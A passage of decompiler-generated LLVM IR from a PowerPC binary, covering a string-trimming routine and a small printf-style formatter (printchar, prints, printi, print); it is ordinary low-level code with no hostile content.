  store i32 %v0_1000049c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100004c0

dec_label_pc_100004b4:                            ; preds = %dec_label_pc_100004c0
  %v1_100004b8 = add i32 %stack_var_-36.0, 1
  br label %dec_label_pc_100004c0

dec_label_pc_100004c0:                            ; preds = %entry, %dec_label_pc_100004b4
  %stack_var_-36.0 = phi i32 [ 0, %entry ], [ %v1_100004b8, %dec_label_pc_100004b4 ]
  %v2_100004cc = add i32 %stack_var_-36.0, %arg1
  %v3_100004cc = inttoptr i32 %v2_100004cc to i8*
  %v3_100004d0 = load i8, i8* %v3_100004cc, align 1
  %v4_100004d0 = zext i8 %v3_100004d0 to i32
  store i32 %v4_100004d0, i32* %r3.global-to-local, align 4
  %v3_100004e0 = call i32 @isspace(i32 %v4_100004d0, i32 %v2_100004cc)
  store i32 %v3_100004e0, i32* %r3.global-to-local, align 4
  %v3_100004e8 = icmp eq i32 %v3_100004e0, 0
  br i1 %v3_100004e8, label %dec_label_pc_10000500.preheader, label %dec_label_pc_100004b4

dec_label_pc_10000500.preheader:                  ; preds = %dec_label_pc_100004c0
  %v1_100004a8 = add i32 %v0_1000049c, -1
  %v2_100005087 = icmp slt i32 %v1_100004a8, %stack_var_-36.0
  br i1 %v2_100005087, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_100004f4:                            ; preds = %dec_label_pc_10000510
  %v1_100004f8 = add i32 %stack_var_-40.010, -1
  %v2_10000508 = icmp slt i32 %v1_100004f8, %stack_var_-36.0
  br i1 %v2_10000508, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_10000510

dec_label_pc_10000510:                            ; preds = %dec_label_pc_10000500.preheader, %dec_label_pc_100004f4
  %stack_var_-40.010 = phi i32 [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %v1_100004a8, %dec_label_pc_10000500.preheader ]
  %v2_1000051c = add i32 %stack_var_-40.010, %arg1
  %v3_1000051c = inttoptr i32 %v2_1000051c to i8*
  %v3_10000520 = load i8, i8* %v3_1000051c, align 1
  %v4_10000520 = zext i8 %v3_10000520 to i32
  store i32 %v4_10000520, i32* %r3.global-to-local, align 4
  %v3_10000530 = call i32 @isspace(i32 %v4_10000520, i32 %v2_1000051c)
  store i32 %v3_10000530, i32* %r3.global-to-local, align 4
  %v3_10000538 = icmp eq i32 %v3_10000530, 0
  br i1 %v3_10000538, label %dec_label_pc_1000058c.preheader, label %dec_label_pc_100004f4

dec_label_pc_1000058c.preheader:                  ; preds = %dec_label_pc_100004f4, %dec_label_pc_10000510, %dec_label_pc_10000500.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %v1_100004a8, %dec_label_pc_10000500.preheader ], [ %v1_100004f8, %dec_label_pc_100004f4 ], [ %stack_var_-40.010, %dec_label_pc_10000510 ]
  %v3_100005943 = icmp sgt i32 %stack_var_-36.0, %stack_var_-40.0.lcssa
  br i1 %v3_100005943, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000054c:                            ; preds = %dec_label_pc_1000058c.preheader, %dec_label_pc_1000054c
  %v2_100005b06 = phi i32 [ %v2_100005b0, %dec_label_pc_1000054c ], [ %arg1, %dec_label_pc_1000058c.preheader ]
  %storemerge15 = phi i32 [ %v1_10000584, %dec_label_pc_1000054c ], [ %stack_var_-36.0, %dec_label_pc_1000058c.preheader ]
  %v2_10000570 = add i32 %storemerge15, %arg1
  %v1_10000574 = inttoptr i32 %v2_10000570 to i8*
  %v2_10000574 = load i8, i8* %v1_10000574, align 1
  %v3_1000057c = inttoptr i32 %v2_100005b06 to i8*
  store i8 %v2_10000574, i8* %v3_1000057c, align 1
  %v1_10000584 = add i32 %storemerge15, 1
  %v3_10000594 = icmp sgt i32 %v1_10000584, %stack_var_-40.0.lcssa
  %v2_100005a4 = sub i32 %v1_10000584, %stack_var_-36.0
  %v2_100005b0 = add i32 %v2_100005a4, %arg1
  br i1 %v3_10000594, label %dec_label_pc_1000059c, label %dec_label_pc_1000054c

dec_label_pc_1000059c:                            ; preds = %dec_label_pc_1000054c, %dec_label_pc_1000058c.preheader
  %v2_100005b0.lcssa = phi i32 [ %arg1, %dec_label_pc_1000058c.preheader ], [ %v2_100005b0, %dec_label_pc_1000054c ]
  %v3_100005b8 = inttoptr i32 %v2_100005b0.lcssa to i8*
  store i8 0, i8* %v3_100005b8, align 1
  %v0_100005d0 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_100005d0

; uselistorder directives
  uselistorder i32 %v1_10000584, { 2, 1, 0 }
  uselistorder i32 %storemerge15, { 1, 0 }
  uselistorder i32 %stack_var_-40.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100004a8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-36.0, { 1, 0, 3, 2, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 6, 1, 4, 5, 0 }
  uselistorder i32 %arg1, { 5, 1, 2, 0, 3, 4, 6, 7 }
  uselistorder label %dec_label_pc_1000054c, { 1, 0 }
  uselistorder label %dec_label_pc_1000058c.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10000510, { 1, 0 }
  uselistorder label %dec_label_pc_100004c0, { 1, 0 }
}

define i32 @printchar(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_100005e8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %stack_var_-20, align 4
  %v3_100005f4 = icmp eq i32 %v0_100005e8, 0
  br i1 %v3_100005f4, label %dec_label_pc_10000628, label %dec_label_pc_100005fc

dec_label_pc_100005fc:                            ; preds = %entry
  %v1_10000600 = inttoptr i32 %v0_100005e8 to i32*
  %v2_10000600 = load i32, i32* %v1_10000600, align 4
  %v1_1000060c = trunc i32 %arg2 to i8
  %v3_1000060c = inttoptr i32 %v2_10000600 to i8*
  store i8 %v1_1000060c, i8* %v3_1000060c, align 1
  %v2_10000614 = load i32, i32* %v1_10000600, align 4
  %v1_10000618 = add i32 %v2_10000614, 1
  store i32 %v1_10000618, i32* %v1_10000600, align 4
  %v0_10000650.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_10000628:                            ; preds = %entry
  %v2_10000628 = ptrtoint i32* %stack_var_-20 to i32
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 268437052, i32* @lr, align 4
  %v2_10000638 = call i32 @__libc_write(i32 1, i32 %v2_10000628)
  store i32 %v2_10000638, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000063c

dec_label_pc_1000063c:                            ; preds = %dec_label_pc_100005fc, %dec_label_pc_10000628
  %v0_10000650 = phi i32 [ %v0_10000650.pre, %dec_label_pc_100005fc ], [ %v2_10000638, %dec_label_pc_10000628 ]
  ret i32 %v0_10000650

; uselistorder directives
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder label %dec_label_pc_1000063c, { 1, 0 }
}

define i32 @prints(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp46 = icmp slt i32 %arg3, 1
  br i1 %tmp46, label %dec_label_pc_10000718, label %dec_label_pc_10000694

dec_label_pc_10000694:                            ; preds = %entry
  %v2_100006c427 = load i8, i8* %arg2, align 1
  %v3_100006cc30 = icmp eq i8 %v2_100006c427, 0
  br i1 %v3_100006cc30, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006a8:                            ; preds = %dec_label_pc_10000694, %dec_label_pc_100006a8
  %v4_100006c032 = phi i32 [ %v1_100006b8, %dec_label_pc_100006a8 ], [ %tmp, %dec_label_pc_10000694 ]
  %stack_var_-20.031 = phi i32 [ %v1_100006ac, %dec_label_pc_100006a8 ], [ 0, %dec_label_pc_10000694 ]
  %v1_100006ac = add i32 %stack_var_-20.031, 1
  %v1_100006b8 = add i32 %v4_100006c032, 1
  %v5_100006bc = inttoptr i32 %v1_100006b8 to i8*
  %v2_100006c4 = load i8, i8* %v5_100006bc, align 1
  %v3_100006cc = icmp eq i8 %v2_100006c4, 0
  br i1 %v3_100006cc, label %dec_label_pc_100006d4, label %dec_label_pc_100006a8

dec_label_pc_100006d4:                            ; preds = %dec_label_pc_100006a8, %dec_label_pc_10000694
  %stack_var_-20.0.lcssa = phi i32 [ 0, %dec_label_pc_10000694 ], [ %v1_100006ac, %dec_label_pc_100006a8 ]
  %v2_100006dc = icmp slt i32 %stack_var_-20.0.lcssa, %arg3
  br i1 %v2_100006dc, label %dec_label_pc_100006f0, label %dec_label_pc_10000700

dec_label_pc_100006f0:                            ; preds = %dec_label_pc_100006d4
  %v2_100006f8 = sub i32 %arg3, %stack_var_-20.0.lcssa
  br label %dec_label_pc_10000700

dec_label_pc_10000700:                            ; preds = %dec_label_pc_100006d4, %dec_label_pc_100006f0
  %storemerge4 = phi i32 [ %v2_100006f8, %dec_label_pc_100006f0 ], [ 0, %dec_label_pc_100006d4 ]
  %v1_10000704 = call i32 @__asm_rlwinm(i32 %arg4, i32 0, i32 30, i32 30)
  %v3_10000708 = icmp eq i32 %v1_10000704, 0
  br i1 %v3_10000708, label %dec_label_pc_10000718, label %dec_label_pc_10000710

dec_label_pc_10000710:                            ; preds = %dec_label_pc_10000700
  br label %dec_label_pc_10000718

dec_label_pc_10000718:                            ; preds = %dec_label_pc_10000700, %entry, %dec_label_pc_10000710
  %stack_var_-32.0 = phi i32 [ %arg3, %entry ], [ %storemerge4, %dec_label_pc_10000700 ], [ %storemerge4, %dec_label_pc_10000710 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ 32, %dec_label_pc_10000700 ], [ 48, %dec_label_pc_10000710 ]
  %v1_1000071c = urem i32 %arg4, 2
  %v3_10000720 = icmp eq i32 %v1_1000071c, 0
  br i1 %v3_10000720, label %dec_label_pc_10000750.preheader, label %dec_label_pc_10000790.preheader

dec_label_pc_10000750.preheader:                  ; preds = %dec_label_pc_10000718
  %v2_1000075420 = icmp sgt i32 %stack_var_-32.0, 0
  br i1 %v2_1000075420, label %dec_label_pc_1000072c.lr.ph, label %dec_label_pc_10000790.preheader

dec_label_pc_1000072c.lr.ph:                      ; preds = %dec_label_pc_10000750.preheader
  %v2_10000734 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_1000072c

dec_label_pc_1000072c:                            ; preds = %dec_label_pc_1000072c.lr.ph, %dec_label_pc_1000072c
  %stack_var_-32.123 = phi i32 [ %stack_var_-32.0, %dec_label_pc_1000072c.lr.ph ], [ %v1_10000748, %dec_label_pc_1000072c ]
  %v3_10000734 = call i32 @printchar(i32* %v2_10000734, i32 %stack_var_-16.0)
  %v1_10000748 = add nsw i32 %stack_var_-32.123, -1
  %v2_10000754 = icmp sgt i32 %stack_var_-32.123, 1
  br i1 %v2_10000754, label %dec_label_pc_1000072c, label %dec_label_pc_10000790.preheader

dec_label_pc_10000790.preheader:                  ; preds = %dec_label_pc_1000072c, %dec_label_pc_10000750.preheader, %dec_label_pc_10000718
  %stack_var_-12.1.ph = phi i32 [ 0, %dec_label_pc_10000718 ], [ 0, %dec_label_pc_10000750.preheader ], [ %stack_var_-32.0, %dec_label_pc_1000072c ]
  %stack_var_-32.2.ph = phi i32 [ %stack_var_-32.0, %dec_label_pc_10000718 ], [ %stack_var_-32.0, %dec_label_pc_10000750.preheader ], [ 0, %dec_label_pc_1000072c ]
  %v2_1000079411 = load i8, i8* %arg2, align 1
  %v3_1000079c14 = icmp eq i8 %v2_1000079411, 0
  br i1 %v3_1000079c14, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760.lr.ph

dec_label_pc_10000760.lr.ph:                      ; preds = %dec_label_pc_10000790.preheader
  %v2_10000774 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_10000760

dec_label_pc_10000760:                            ; preds = %dec_label_pc_10000760.lr.ph, %dec_label_pc_10000760
  %v4_1000079017 = phi i32 [ %tmp, %dec_label_pc_10000760.lr.ph ], [ %v1_10000788, %dec_label_pc_10000760 ]
  %stack_var_-36.016 = phi i8* [ %arg2, %dec_label_pc_10000760.lr.ph ], [ %v5_1000078c, %dec_label_pc_10000760 ]
  %stack_var_-12.115 = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000760.lr.ph ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_10000764 = load i8, i8* %stack_var_-36.016, align 1
  %v3_10000764 = zext i8 %v2_10000764 to i32
  %v3_10000774 = call i32 @printchar(i32* %v2_10000774, i32 %v3_10000764)
  %v1_1000077c = add i32 %stack_var_-12.115, 1
  %v1_10000788 = add i32 %v4_1000079017, 1
  %v5_1000078c = inttoptr i32 %v1_10000788 to i8*
  %v2_10000794 = load i8, i8* %v5_1000078c, align 1
  %v3_1000079c = icmp eq i8 %v2_10000794, 0
  br i1 %v3_1000079c, label %dec_label_pc_100007cc.preheader, label %dec_label_pc_10000760

dec_label_pc_100007cc.preheader:                  ; preds = %dec_label_pc_10000760, %dec_label_pc_10000790.preheader
  %stack_var_-12.1.lcssa = phi i32 [ %stack_var_-12.1.ph, %dec_label_pc_10000790.preheader ], [ %v1_1000077c, %dec_label_pc_10000760 ]
  %v2_100007d06 = icmp sgt i32 %stack_var_-32.2.ph, 0
  br i1 %v2_100007d06, label %dec_label_pc_100007a8.lr.ph, label %dec_label_pc_100007d8

dec_label_pc_100007a8.lr.ph:                      ; preds = %dec_label_pc_100007cc.preheader
  %v2_100007b0 = inttoptr i32 %arg1 to i32*
  br label %dec_label_pc_100007a8

dec_label_pc_100007a8:                            ; preds = %dec_label_pc_100007a8.lr.ph, %dec_label_pc_100007a8
  %stack_var_-32.39 = phi i32 [ %stack_var_-32.2.ph, %dec_label_pc_100007a8.lr.ph ], [ %v1_100007c4, %dec_label_pc_100007a8 ]
  %v3_100007b0 = call i32 @printchar(i32* %v2_100007b0, i32 %stack_var_-16.0)
  %v1_100007c4 = add nsw i32 %stack_var_-32.39, -1
  %v2_100007d0 = icmp sgt i32 %stack_var_-32.39, 1
  br i1 %v2_100007d0, label %dec_label_pc_100007a8, label %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge

dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge: ; preds = %dec_label_pc_100007a8
  %tmp47 = add i32 %stack_var_-12.1.lcssa, %stack_var_-32.2.ph
  br label %dec_label_pc_100007d8

dec_label_pc_100007d8:                            ; preds = %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge, %dec_label_pc_100007cc.preheader
  %stack_var_-12.2.lcssa = phi i32 [ %tmp47, %dec_label_pc_100007cc.dec_label_pc_100007d8_crit_edge ], [ %stack_var_-12.1.lcssa, %dec_label_pc_100007cc.preheader ]
  ret i32 %stack_var_-12.2.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-12.1.lcssa, { 1, 0 }
  uselistorder i32 %v1_10000788, { 1, 0 }
  uselistorder i32 %stack_var_-32.0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %stack_var_-20.0.lcssa, { 1, 0 }
  uselistorder i32 %v1_100006b8, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 %arg3, { 2, 0, 1, 3 }
  uselistorder i8* %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100007a8, { 1, 0 }
  uselistorder label %dec_label_pc_10000760, { 1, 0 }
  uselistorder label %dec_label_pc_1000072c, { 1, 0 }
  uselistorder label %dec_label_pc_10000718, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10000700, { 1, 0 }
  uselistorder label %dec_label_pc_100006a8, { 1, 0 }
}

define i32 @printi(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %v3_10000844 = icmp eq i32 %arg2, 0
  br i1 %v3_10000844, label %dec_label_pc_1000084c, label %dec_label_pc_10000880

dec_label_pc_1000084c:                            ; preds = %entry
  store i32 48, i32* %stack_var_-88, align 4
  %v4_10000870 = bitcast i32* %stack_var_-88 to i8*
  %v5_10000870 = call i32 @prints(i32 %arg1, i8* %v4_10000870, i32 %arg5, i32 %arg6)
  br label %dec_label_pc_100009d8

dec_label_pc_10000880:                            ; preds = %entry
  %v3_10000884 = icmp eq i32 %arg4, 0
  br i1 %v3_10000884, label %dec_label_pc_100008b8, label %dec_label_pc_1000088c

dec_label_pc_1000088c:                            ; preds = %dec_label_pc_10000880
  %v3_10000890 = icmp eq i32 %arg3, 10
  br i1 %v3_10000890, label %dec_label_pc_10000898, label %dec_label_pc_100008b8

dec_label_pc_10000898:                            ; preds = %dec_label_pc_1000088c
  %tmp27 = icmp sgt i32 %arg2, -1
  br i1 %tmp27, label %dec_label_pc_100008b8, label %dec_label_pc_100008a4

dec_label_pc_100008a4:                            ; preds = %dec_label_pc_10000898
  %v1_100008b0 = sub i32 0, %arg2
  br label %dec_label_pc_100008b8

dec_label_pc_100008b8:                            ; preds = %dec_label_pc_1000088c, %dec_label_pc_10000898, %dec_label_pc_10000880, %dec_label_pc_100008a4
  %stack_var_-44.0 = phi i32 [ %arg2, %dec_label_pc_10000880 ], [ %arg2, %dec_label_pc_10000898 ], [ %v1_100008b0, %dec_label_pc_100008a4 ], [ %arg2, %dec_label_pc_1000088c ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_10000880 ], [ 0, %dec_label_pc_10000898 ], [ 1, %dec_label_pc_100008a4 ], [ 0, %dec_label_pc_1000088c ]
  %tmp28 = bitcast i32* %stack_var_-77 to i8*
  store i8 0, i8* %tmp28, align 4
  %v3_100009445 = icmp eq i32 %stack_var_-44.0, 0
  br i1 %v3_100009445, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0.lr.ph

dec_label_pc_100008d0.lr.ph:                      ; preds = %dec_label_pc_100008b8
  %v2_10000900 = add i32 %arg7, -58
  br label %dec_label_pc_100008d0

dec_label_pc_100008d0:                            ; preds = %dec_label_pc_100008d0.lr.ph, %dec_label_pc_1000090c
  %stack_var_-44.17 = phi i32 [ %stack_var_-44.0, %dec_label_pc_100008d0.lr.ph ], [ %v2_10000938, %dec_label_pc_1000090c ]
  %stack_var_-28.06 = phi i8* [ %tmp28, %dec_label_pc_100008d0.lr.ph ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v2_100008d8 = urem i32 %stack_var_-44.17, %arg3
  %tmp29 = icmp slt i32 %v2_100008d8, 10
  br i1 %tmp29, label %dec_label_pc_1000090c, label %dec_label_pc_100008f8

dec_label_pc_100008f8:                            ; preds = %dec_label_pc_100008d0
  %v1_10000904 = add i32 %v2_10000900, %v2_100008d8
  br label %dec_label_pc_1000090c

dec_label_pc_1000090c:                            ; preds = %dec_label_pc_100008d0, %dec_label_pc_100008f8
  %stack_var_-32.0 = phi i32 [ %v2_100008d8, %dec_label_pc_100008d0 ], [ %v1_10000904, %dec_label_pc_100008f8 ]
  %v4_1000090c = ptrtoint i8* %stack_var_-28.06 to i32
  %v1_10000910 = add i32 %v4_1000090c, -1
  %v5_10000914 = inttoptr i32 %v1_10000910 to i8*
  %fold = add i32 %stack_var_-32.0, 48
  %v1_1000092c = trunc i32 %fold to i8
  store i8 %v1_1000092c, i8* %v5_10000914, align 1
  %v2_10000938 = udiv i32 %stack_var_-44.17, %arg3
  %v3_10000944 = icmp ult i32 %stack_var_-44.17, %arg3
  br i1 %v3_10000944, label %dec_label_pc_1000094c, label %dec_label_pc_100008d0

dec_label_pc_1000094c:                            ; preds = %dec_label_pc_1000090c, %dec_label_pc_100008b8
  %stack_var_-28.0.lcssa = phi i8* [ %tmp28, %dec_label_pc_100008b8 ], [ %v5_10000914, %dec_label_pc_1000090c ]
  %v3_10000950 = icmp eq i32 %stack_var_-36.0, 0
  br i1 %v3_10000950, label %dec_label_pc_100009b4, label %dec_label_pc_10000958

dec_label_pc_10000958:                            ; preds = %dec_label_pc_1000094c
  %v3_1000095c = icmp eq i32 %arg5, 0
  br i1 %v3_1000095c, label %dec_label_pc_1000099c, label %dec_label_pc_10000964

dec_label_pc_10000964:                            ; preds = %dec_label_pc_10000958
  %v1_10000968 = call i32 @__asm_rlwinm(i32 %arg6, i32 0, i32 30, i32 30)
  %v3_1000096c = icmp eq i32 %v1_10000968, 0
  br i1 %v3_1000096c, label %dec_label_pc_1000099c, label %dec_label_pc_10000974

dec_label_pc_10000974:                            ; preds = %dec_label_pc_10000964
  %v2_1000097c = inttoptr i32 %arg1 to i32*
  %v3_1000097c = call i32 @printchar(i32* %v2_1000097c, i32 45)
  %v1_10000990 = add i32 %arg5, -1
  br label %dec_label_pc_100009b4

dec_label_pc_1000099c:                            ; preds = %dec_label_pc_10000964, %dec_label_pc_10000958
  %v4_1000099c = ptrtoint i8* %stack_var_-28.0.lcssa to i32
  %v1_100009a0 = add i32 %v4_1000099c, -1
  %v5_100009a4 = inttoptr i32 %v1_100009a0 to i8*
  store i8 45, i8* %v5_100009a4, align 1
  br label %dec_label_pc_100009b4

dec_label_pc_100009b4:                            ; preds = %dec_label_pc_1000094c, %dec_label_pc_10000974, %dec_label_pc_1000099c
  %stack_var_-28.1 = phi i8* [ %stack_var_-28.0.lcssa, %dec_label_pc_1000094c ], [ %v5_100009a4, %dec_label_pc_1000099c ], [ %stack_var_-28.0.lcssa, %dec_label_pc_10000974 ]
  %stack_var_-56.0 = phi i32 [ %arg5, %dec_label_pc_1000094c ], [ %arg5, %dec_label_pc_1000099c ], [ %v1_10000990, %dec_label_pc_10000974 ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_1000094c ], [ 0, %dec_label_pc_1000099c ], [ 1, %dec_label_pc_10000974 ]
  %v5_100009c4 = call i32 @prints(i32 %arg1, i8* %stack_var_-28.1, i32 %stack_var_-56.0, i32 %arg6)
  %v2_100009d0 = add i32 %v5_100009c4, %stack_var_-40.0
  br label %dec_label_pc_100009d8

dec_label_pc_100009d8:                            ; preds = %dec_label_pc_1000084c, %dec_label_pc_100009b4
  %storemerge = phi i32 [ %v2_100009d0, %dec_label_pc_100009b4 ], [ %v5_10000870, %dec_label_pc_1000084c ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %stack_var_-28.0.lcssa, { 2, 0, 1 }
  uselistorder i8* %v5_10000914, { 0, 2, 1 }
  uselistorder i32 %v2_100008d8, { 1, 0, 2 }
  uselistorder i32 %stack_var_-44.17, { 0, 2, 1 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 0, 2, 4 }
  uselistorder i32 %arg3, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 0, 2, 4, 1, 3, 5 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_100009d8, { 1, 0 }
  uselistorder label %dec_label_pc_100009b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000090c, { 1, 0 }
  uselistorder label %dec_label_pc_100008d0, { 1, 0 }
  uselistorder label %dec_label_pc_100008b8, { 3, 1, 0, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg3 to i8*
  %tmp41 = ptrtoint i32* %arg1 to i32
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-68.427 = inttoptr i32 %arg2 to i8*
  %v2_10000fc828 = load i8, i8* %stack_var_-68.427, align 1
  %v3_10000fd031 = icmp eq i8 %v2_10000fc828, 0
  br i1 %v3_10000fd031, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a24.lr.ph

dec_label_pc_10000a24.lr.ph:                      ; preds = %entry
  %v1_10000b98 = add i32 %arg3, 4
  %v2_10000b98 = inttoptr i32 %v1_10000b98 to i32*
  %v1_10000b60 = add i32 %arg3, 8
  %v2_10000b60 = inttoptr i32 %v1_10000b60 to i32*
  %v4_10000f7c = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_10000a24

dec_label_pc_10000a24:                            ; preds = %dec_label_pc_10000a24.lr.ph, %dec_label_pc_10000fb8
  %stack_var_-68.434 = phi i8* [ %stack_var_-68.427, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-68.4, %dec_label_pc_10000fb8 ]
  %stack_var_-68.4.in33 = phi i32 [ %arg2, %dec_label_pc_10000a24.lr.ph ], [ %v1_10000fbc, %dec_label_pc_10000fb8 ]
  %stack_var_-56.132 = phi i32 [ 0, %dec_label_pc_10000a24.lr.ph ], [ %stack_var_-56.0, %dec_label_pc_10000fb8 ]
  %v2_10000a28 = load i8, i8* %stack_var_-68.434, align 1
  %v3_10000a30 = icmp eq i8 %v2_10000a28, 37
  br i1 %v3_10000a30, label %dec_label_pc_10000a38, label %dec_label_pc_10000f94

dec_label_pc_10000a38:                            ; preds = %dec_label_pc_10000a24
  %v1_10000a3c = add i32 %stack_var_-68.4.in33, 1
  %v5_10000a40 = inttoptr i32 %v1_10000a3c to i8*
  %v2_10000a58 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a60 = icmp eq i8 %v2_10000a58, 0
  br i1 %v3_10000a60, label %dec_label_pc_10000fd8, label %dec_label_pc_10000a68

dec_label_pc_10000a68:                            ; preds = %dec_label_pc_10000a38
  %v2_10000a6c = load i8, i8* %v5_10000a40, align 1
  %v3_10000a74 = icmp eq i8 %v2_10000a6c, 37
  br i1 %v3_10000a74, label %dec_label_pc_10000f94, label %dec_label_pc_10000a7c

dec_label_pc_10000a7c:                            ; preds = %dec_label_pc_10000a68
  %v2_10000a80 = load i8, i8* %v5_10000a40, align 1
  %v3_10000a88 = icmp eq i8 %v2_10000a80, 45
  br i1 %v3_10000a88, label %dec_label_pc_10000a90, label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000a90:                            ; preds = %dec_label_pc_10000a7c
  %v1_10000a94 = add i32 %stack_var_-68.4.in33, 2
  %v5_10000a98 = inttoptr i32 %v1_10000a94 to i8*
  br label %dec_label_pc_10000ac0.preheader

dec_label_pc_10000ac0.preheader:                  ; preds = %dec_label_pc_10000a90, %dec_label_pc_10000a7c
  %stack_var_-68.0.ph = phi i8* [ %v5_10000a40, %dec_label_pc_10000a7c ], [ %v5_10000a98, %dec_label_pc_10000a90 ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10000a7c ], [ 1, %dec_label_pc_10000a90 ]
  %v4_10000ac03 = ptrtoint i8* %stack_var_-68.0.ph to i32
  %v2_10000ac44 = load i8, i8* %stack_var_-68.0.ph, align 1
  %v3_10000acc8 = icmp eq i8 %v2_10000ac44, 48
  br i1 %v3_10000acc8, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000aa8:                            ; preds = %dec_label_pc_10000ac0.preheader, %dec_label_pc_10000aa8
  %v4_10000ac010 = phi i32 [ %v1_10000aac, %dec_label_pc_10000aa8 ], [ %v4_10000ac03, %dec_label_pc_10000ac0.preheader ]
  %stack_var_-52.09 = phi i32 [ %v1_10000ab8, %dec_label_pc_10000aa8 ], [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ]
  %v1_10000aac = add i32 %v4_10000ac010, 1
  %v5_10000ab0 = inttoptr i32 %v1_10000aac to i8*
  %v1_10000ab8 = or i32 %stack_var_-52.09, 2
  %v2_10000ac4 = load i8, i8* %v5_10000ab0, align 1
  %v3_10000acc = icmp eq i8 %v2_10000ac4, 48
  br i1 %v3_10000acc, label %dec_label_pc_10000aa8, label %dec_label_pc_10000b0c.preheader

dec_label_pc_10000b0c.preheader:                  ; preds = %dec_label_pc_10000aa8, %dec_label_pc_10000ac0.preheader
  %stack_var_-52.0.lcssa = phi i32 [ %stack_var_-52.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v1_10000ab8, %dec_label_pc_10000aa8 ]
  %stack_var_-68.0.lcssa = phi i8* [ %stack_var_-68.0.ph, %dec_label_pc_10000ac0.preheader ], [ %v5_10000ab0, %dec_label_pc_10000aa8 ]
  %v4_10000b0c12 = ptrtoint i8* %stack_var_-68.0.lcssa to i32
  %v2_10000b1013 = load i8, i8* %stack_var_-68.0.lcssa, align 1
  %tmp62 = icmp ult i8 %v2_10000b1013, 48
  br i1 %tmp62, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000ad8:                            ; preds = %dec_label_pc_10000b20
  %v1_10000adc = mul i32 %stack_var_-48.018, 10
  %v2_10000ae8 = load i8, i8* %stack_var_-68.119, align 1
  %v3_10000ae8 = zext i8 %v2_10000ae8 to i32
  %v2_10000af4 = add i32 %v1_10000adc, -48
  %v1_10000af8 = add i32 %v2_10000af4, %v3_10000ae8
  %v1_10000b04 = add i32 %v4_10000b0c20, 1
  %v5_10000b08 = inttoptr i32 %v1_10000b04 to i8*
  %v2_10000b10 = load i8, i8* %v5_10000b08, align 1
  %tmp63 = icmp ult i8 %v2_10000b10, 48
  br i1 %tmp63, label %dec_label_pc_10000b34, label %dec_label_pc_10000b20

dec_label_pc_10000b20:                            ; preds = %dec_label_pc_10000b0c.preheader, %dec_label_pc_10000ad8
  %v4_10000b0c20 = phi i32 [ %v1_10000b04, %dec_label_pc_10000ad8 ], [ %v4_10000b0c12, %dec_label_pc_10000b0c.preheader ]
